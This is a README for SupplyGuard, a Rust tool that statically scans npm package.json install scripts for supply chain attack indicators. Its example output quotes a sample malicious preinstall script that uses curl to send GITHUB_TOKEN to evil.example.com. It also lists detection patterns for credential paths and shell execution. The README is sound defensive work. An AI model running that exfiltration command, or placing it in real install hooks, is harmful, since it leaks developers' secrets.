# SupplyGuard

A static analysis tool that scans npm `package.json` files for supply chain attack indicators before installation.

## The Problem

Supply chain attacks against npm packages are a growing threat. Malicious packages exploit npm's lifecycle hooks — `preinstall`, `install`, and `postinstall` — to execute arbitrary code the moment a developer runs `npm install`. By the time the script runs, it's too late: credentials can be exfiltrated, backdoors planted, or the system compromised.

SupplyGuard intercepts this by statically analysing the package before installation runs.

## How It Works

```
package.json
     │
     ▼
  Parser          Reads and validates the file (max 1 MB)
     │
     ▼
  Analyzer        Extracts preinstall / install / postinstall scripts
     │
     ▼
  ThreatDetector  Matches 31 regex patterns across 5 threat categories
     │
     ▼
  RiskScorer      Aggregates weighted scores → 0–100, Low/Medium/High/Critical
     │
     ▼
  Report          Per-script findings + PASS / SUSPICIOUS / BLOCK verdict
```

## Threat Categories

| Category | What it detects | Example indicators |
|---|---|---|
| **Network Activity** | Outbound connections | `fetch()`, `axios`, `XMLHttpRequest`, hardcoded URLs |
| **Data Exfiltration** | Credential and secret theft | `process.env.GITHUB_TOKEN`, `.ssh/`, `.aws/`, `.npmrc` |
| **Process Execution** | Shell and command execution | `child_process.exec`, `eval()`, `Function()`, `bash` |
| **File System Tampering** | Dangerous writes and traversal | `fs.writeFile`, `../`, `/etc/`, `C:\Windows` |
| **Obfuscation** | Attempts to hide intent | `atob()`, `String.fromCharCode`, hex arrays, `\xNN` |

Each pattern carries a risk weight (5–35). The total is capped at 100 and mapped to a severity level:

| Score | Severity |
|---|---|
| 0 – 20 | Low |
| 21 – 50 | Medium |
| 51 – 75 | High |
| 76 – 100 | Critical |

A confidence score (0–1) reflects both the number and diversity of threat categories detected. The final verdict combines severity and confidence:

- **BLOCK** — Critical severity, or High with confidence > 60%
- **SUSPICIOUS** — Score > 50, or score > 30 with confidence > 70%
- **PASS** — Below all thresholds

## Installation

Requires [Rust](https://rustup.rs/) (edition 2021).

```bash
git clone https://github.com/thil4n/supplygaurd
cd supplygaurd
cargo build --release
```

The binary is at `target/release/supplygaurd`.

## Usage

```bash
# Scan a specific package.json
supplygaurd path/to/package.json

# Defaults to ./package.json if no argument given
supplygaurd
```

### Example output — malicious package

```
Scanning: datasets/malicious/package.json

SupplyGuard Analysis Report
==================================================
Package : totally-legit-utils v1.0.0
File    : datasets/malicious/package.json

[HIGH] preinstall script
  Script    : node -e "const cp = require('child_process'); cp.exec('curl https://evil.example.com/exfil?token=' + process.env.GITHUB_TOKEN); "
  Risk Score: 70/100  |  Confidence: 48%  |  Threats: 4
  Indicators:
    • [Network      ] Hardcoded URL                       — https://evil.example.com/exfil?token=
    • [Exfiltration ] Environment variable access         — process.env
    • [Exfiltration ] Sensitive env var                   — GITHUB_TOKEN
    • [Execution    ] Child process import                — require('child_process')

==================================================
VERDICT: SUSPICIOUS — Manual review recommended before installing.
```

### Example output — clean package

```
Scanning: package.json

SupplyGuard Analysis Report
==================================================
Package : my-package v1.0.0
File    : package.json

No install scripts found — nothing to analyze.

VERDICT: PASS — No install scripts present.
```

### Exit codes

| Code | Meaning |
|---|---|
| `0` | PASS or SUSPICIOUS |
| `1` | BLOCK — do not install |

Use exit code 1 to block installation in CI or pre-install hooks:

```bash
supplygaurd package.json || exit 1
```

## Project Structure

```
src/
├── main.rs                  Entry point, CLI argument handling, report formatting
├── parser/
│   ├── mod.rs               File reading, size validation, JSON parsing
│   └── package_json.rs      PackageJson struct (serde)
└── analyser/
    ├── mod.rs               Pipeline: extract scripts → detect → score → AnalysisResult
    ├── threat.rs            ThreatDetector — 31 regex patterns, 5 categories
    └── risk_score.rs        RiskScore — weighted aggregation, severity, confidence
datasets/
├── benign/package.json      Sample clean package
└── malicious/package.json   Sample attack package (for testing)
```

## Running Tests

```bash
cargo test
```

Five unit tests cover severity classification, risk score calculation, network detection, exfiltration detection, and process execution detection.

## Limitations

- **Static analysis only** — SupplyGuard reads scripts as plain text. A determined attacker can evade pattern matching by downloading and executing a second-stage payload, using dynamic `require()`, or splitting strings at runtime.
- **Install scripts only** — Scripts outside `preinstall`/`install`/`postinstall` are not scanned. Malicious code in the package's JavaScript files themselves is out of scope.
- **No dependency graph traversal** — Transitive dependencies are not analysed.
- **False positives** — Legitimate packages (build tools, installers) may use `child_process` or write to the filesystem. Always verify a SUSPICIOUS verdict before discarding a package.

## Roadmap

- [ ] Scan inline JavaScript files inside the package tarball
- [ ] AST-based analysis (SWC parser is already a dependency) for higher precision
- [ ] Dependency graph traversal via the npm registry API
- [ ] JSON output mode for CI integration
- [ ] npm lifecycle hook integration (`npx supplygaurd` as a global pre-install hook)
